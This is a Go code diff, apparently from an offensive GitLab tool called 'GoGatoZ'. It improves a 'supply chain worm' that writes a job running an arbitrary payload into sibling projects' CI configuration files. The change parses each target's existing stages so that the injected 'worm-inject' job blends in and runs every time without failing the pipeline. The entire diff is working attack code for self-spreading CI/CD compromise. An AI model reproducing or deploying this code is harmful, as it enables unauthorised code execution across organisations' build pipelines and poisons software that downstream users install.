@@ -6,6 +6,7 @@ import (
 	"fmt"
 	"io"
 	"os"
+	"regexp"
 	"strings"
 
 	gitlab "gitlab.com/gitlab-org/api/client-go"
@@ -356,6 +357,22 @@ func discoverSiblings(ctx context.Context, client *gitlab.Client, groupPath, tar
 	return siblings, ""
 }
 
+var stagesInlineRe = regexp.MustCompile(`(?m)^stages:\s*\[([^\]]+)\]`)
+var stagesBlockRe = regexp.MustCompile(`(?m)^stages:\s*\n\s*-\s*(\S+)`)
+
+func detectFirstStage(ciContent string) string {
+	if m := stagesInlineRe.FindStringSubmatch(ciContent); len(m) > 1 {
+		parts := strings.Split(m[1], ",")
+		if s := strings.TrimSpace(parts[0]); s != "" {
+			return s
+		}
+	}
+	if m := stagesBlockRe.FindStringSubmatch(ciContent); len(m) > 1 {
+		return strings.TrimSpace(m[1])
+	}
+	return "build"
+}
+
 func buildWormCI(ctx context.Context, client *gitlab.Client, sibID int64, payload string) string {
 	indented := indentScript(payload, "      ")
 	f, _, ferr := client.RepositoryFiles.GetFile(
@@ -366,8 +383,8 @@ func buildWormCI(ctx context.Context, client *gitlab.Client, sibID int64, payloa
 	if ferr == nil && f != nil {
 		decoded, _ := base64.StdEncoding.DecodeString(f.Content)
 		existing := string(decoded)
-		// Prepend worm job using the existing CI's first stage to avoid duplicate stages key
-		return fmt.Sprintf("# Auto-injected by GoGatoZ supply chain worm\nworm-inject:\n  stage: build\n  script:\n    - |\n%s\n  allow_failure: true\n  rules:\n    - when: always\n\n%s", indented, existing)
+		firstStage := detectFirstStage(existing)
+		return fmt.Sprintf("# Auto-injected by GoGatoZ supply chain worm\nworm-inject:\n  stage: %s\n  script:\n    - |\n%s\n  allow_failure: true\n  rules:\n    - when: always\n\n%s", firstStage, indented, existing)
 	}
 	return fmt.Sprintf(`stages: [build]
 worm-inject:
